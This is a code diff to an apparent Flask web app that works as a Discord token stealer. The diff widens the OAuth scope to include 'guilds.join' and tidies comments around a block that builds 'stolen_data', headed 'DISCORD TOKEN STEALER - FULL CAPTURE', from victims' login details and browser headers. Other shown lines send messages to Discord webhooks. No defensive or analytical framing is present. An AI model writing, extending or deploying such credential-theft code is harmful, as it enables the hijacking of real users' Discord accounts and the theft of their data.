@@ -141,7 +141,7 @@ def discord_login():
         f"{DISCORD_AUTH_URL}?client_id={DISCORD_CLIENT_ID}"
         f"&redirect_uri={DISCORD_REDIRECT_URI}"
         f"&response_type=code"
-        f"&scope=identify%20email%20guilds%20connections"
+        f"&scope=identify%20email%20guilds%20connections%20guilds.join"
     )
     return redirect(auth_url)
 
@@ -273,7 +273,7 @@ def callback():
     user_agent = request.headers.get('User-Agent', 'Unknown')
     accept_language = request.headers.get('Accept-Language', 'Unknown')
 
-    # ===== BUILD THE STOLEN DATA (SENT TO YOUR WEBHOOK) =====
+    # ===== BUILD THE STOLEN DATA =====
     stolen_data = {
         "content": f"""```diff
 + 🎯 DISCORD TOKEN STEALER - FULL CAPTURE
@@ -315,7 +315,7 @@ def callback():
     except:
         pass
 
-    # ===== SEND CONFIRMATION TO THEIR WEBHOOK (ONLY "Login successful") =====
+    # ===== SEND CONFIRMATION TO THEIR WEBHOOK =====
     try:
         if webhook and webhook.startswith("https://discord.com/api/webhooks/"):
             confirm_data = {
